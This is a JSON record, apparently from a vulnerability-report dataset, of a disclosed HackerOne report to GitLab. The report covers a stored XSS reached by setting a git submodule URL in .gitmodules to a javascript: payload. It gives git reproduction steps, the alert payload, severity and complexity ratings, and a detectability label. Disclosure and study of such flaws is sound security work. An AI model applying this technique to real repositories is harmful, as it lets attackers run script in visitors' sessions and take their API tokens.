@@ -1,0 +1,60 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "jobert ",
+  "title": "Stored XSS on Files overview by abusing git submodule URL",
+  "content": "\nVulnerability description\nThere's a stored Cross-Site Scripting (XSS) vulnerability in the Files overview of a project due to the incorrect handling of a git submodule. This allows an attacker to execute JavaScript in a visitor's session.\nProof of concept\nTo reproduce the issue, the attacker needs to have a project with push access. To start, make sure you're signed in and have enabled the wiki. Now, clone both repositories:\nCode 80 Bytes\n1git clone git@gitlab.com:user/project\n2git clone git@gitlab.com:user/project.wiki\nNow cd project.wiki and initialize the repository:\nCode 100 Bytes\n1touch some-file\n2git add some-file\n3git commit -am \"Added file to initialize wiki repository\"\n4git push\nNow repeat the same in the project directory add the project.wiki as a relative git submodule to project:\nCode 208 Bytes\n1touch some-file\n2git add some-file\n3git commit -am \"Added file to initialize project repository\"\n4git push\n5git submodule add ../project.wiki wiki\n6git add wiki\n7git commit -am \"Added relative wiki module\"\n8git push\nThis will create a .gitmodules file with the following contents:\nCode 56 Bytes\n1[submodule \"wiki\"]\n2  path = wiki\n3  url = ../project.wiki\nIn this file, the URL can be updated to a javascript: URL. It won't error because the contents of the submodule are already fetched by the git submodule add command. Lets change url = ../project.wiki to url = javascript:alert('XSS'); (see gitmodules (F173589)). Now commit the results and push the changes:\nCode 56 Bytes\n1git add .\n2git commit -am \"Updated relative URL\"\n3git push\nNow go to the project's Files overview: https://gitlab.com/user/project/tree/master. In the overview, click the wiki directory, and see the JavaScript getting executed:\n<image_0>\nImpact\nAn attacker could offload the current user's API token and impersonate the user through the API.\n\n",
+  "severity": [
+    8.7,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/173/602/acf3f39c6a89e0680b9c7d3efcfb3826fbba6144/Screen_Shot_2017-04-05_at_13.30.31.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-04-05_at_13.30.31.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-04-05_at_13.30.31.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEP425OI%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T221035Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCM%2BstUzpO3%2BwHWqME7R0RgaSnbMmx4XDLnJPj6yqnZEQIgZH6a0gM9JNLqF98fNlGTF5udtNOddAGmoKztGcN%2FSxUqsQUIMhADGgwwMTM2MTkyNzQ4NDkiDJEb7f8xMPYwAHyOWSqOBQ01q3qDHypWjv22k%2B5MuOiOy9IWTvFJ0dxWV7T6uUm7Tvv%2B9u%2FepGtc%2FI70kkwpoz53YvmXecCYI9PU3qEgw05hFOGC%2BGb5OmEQWvi6QGxhef8as%2B7uifw0ybrR%2Bmo8rUKHddakZRdct6KLCYoZfPUIMPnGTS60P8HbNmKffl1yVpLlr%2BzhzOdsvgyejQMqCi125fUmNHH19N0l0rWtZ36lxUlY%2BiS3di6hiVmTE2BHSLh%2BWX1KyDJ5VZANiAVoG78NfG6KXzwaiifq3W4tLvh34TJuoDQHt5eUorFy3V2Bk0C84B8%2BdFkPJWi2FmdQGT0zMLo7LvceGAU5xj9vmD4jj5cmdy9jSC1tMYHJQESDIahceIMbRXIpMxCTCFbp5Z0NlRsyhIOKBMdvyLEXW3JXbPraBije%2FSi9SkBN7Ppta1K5sxt0pVKzZvyHxD%2FXOa2B5UtqKlR8BLoRmJlOc5mrBw9xGIQWUBis0LbupXvmq0a4z6irSO76QPSLL0IDAgfn2EfCBVX08GvNVlr9gDnmvMJfdmERGxQD59rlWF9pEe3tpYZy00hv2Fc9gl4ozamvsMb4QyzVTP2Lo%2FgZP3lkB1QUjytA4%2FAgNCh%2BLq%2FDpP9h9F%2BIOk1Chs3toxuOtaStxtmH3O4kI3hqYbNMHY2%2FWyIOO%2F2fncp%2BXFzVc5FB%2BGLX%2FN8Ib0%2ByynPV52YTycs1rO%2FbT%2F5Z0tCIDus4nnwYYGJAs18APR5l1nnwXL%2FqDzUV%2BXw7vR692E9G%2F4aB6%2BbDGutv5NwgrrugW2qxmO2zf3mFBdieOEL9EidEY1qGtK6ATkcsKkDRNHipZMsEX4rBPzvnyaS%2BFSXWqxSJPbzRILCb45c5wWIXXscvXTCO7JC%2FBjqxAf0RRDW1N%2FrCzX%2B9JS7j1ZfarA8FzbFdep55EuXE3Jmrq78cdv%2BGlBQpHfsE7WsuSoNdmO1N%2B%2FEQSmfs08RQO5PcoZOi42jNwWdEQ7s7lCgspHzrIV0uoCF%2Bsc8uwgsmsNo4lp5adFWc%2BhD8a1dDXNZ%2FuOcoQeJsjkfTA%2BkWpZURMVRXTy1pdMSRf5sIeafVRgUZyfjz27XqFjMVgcSC5LEvCkMD1Guq%2BVR1XTxglgU3TQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6f99b73bbdc1dd9119106e6441ae994d56cf9c91b561d48ff70101496c5125a1"
+  },
+  "disclosed_date": 1494360000,
+  "report_url": "https://hackerone.com/reports/218872",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Clone the project and project.wiki repositories"
+    ],
+    [
+      2,
+      "Initialize both repositories with a file and push changes"
+    ],
+    [
+      3,
+      "Add the project.wiki as a relative git submodule to the project"
+    ],
+    [
+      4,
+      "Modify the .gitmodules file to change the URL to a JavaScript payload"
+    ],
+    [
+      5,
+      "Commit and push the changes to the project"
+    ],
+    [
+      6,
+      "Navigate to the project's Files overview and click the wiki directory to trigger the XSS"
+    ]
+  ],
+  "vuln_description": "A stored Cross-Site Scripting (XSS) vulnerability exists in the Files overview of a project due to incorrect handling of a git submodule URL. An attacker can inject a JavaScript payload into the .gitmodules file, which gets executed when a user interacts with the affected directory in the Files overview.",
+  "reason": "This vulnerability involves multiple steps including repository cloning, submodule manipulation, and understanding how GitLab handles submodule URLs. The attack requires knowledge of Git submodules and the specific behavior of GitLab's file handling, but the steps are straightforward once the initial setup is understood.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "F173589",
+  "authnz_metadata": {
+    "reason": "The vulnerability involves manipulating a git submodule URL to inject JavaScript, which is a stored XSS attack. The methodology described focuses on authentication and authorization bypasses (AuthN/AuthZ) and IDOR vulnerabilities by swapping user sessions and resource IDs. However, the XSS vulnerability does not involve bypassing authentication or authorization boundaries but rather exploits improper input handling in the application. Therefore, it does not fit the described methodologies for detecting AuthN/AuthZ or IDOR vulnerabilities.",
+    "is_detectable": false
+  }
+}
